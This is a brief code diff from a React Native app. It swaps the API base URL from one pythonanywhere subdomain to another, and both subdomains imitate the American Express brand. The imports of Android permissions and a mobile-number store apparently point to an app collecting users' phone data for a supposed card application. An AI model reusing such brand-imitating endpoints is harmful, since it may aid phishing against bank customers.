@@ -3,8 +3,8 @@ import AsyncStorage from "@react-native-async-storage/async-storage";
 import { Alert, PermissionsAndroid } from "react-native";
 import { setId } from './store/mobileNumberSlice'
 
-const baseUrl = "https://applyamexcard.pythonanywhere.com/api/"
-// const baseUrl = "https://sumit245.pythonanywhere.com/api/"
+const baseUrl = "https://applyamexcards.pythonanywhere.com/api/"
+
 let isSending = false
 let lastRequestTime = 0; // Track the last time a request was sent
 
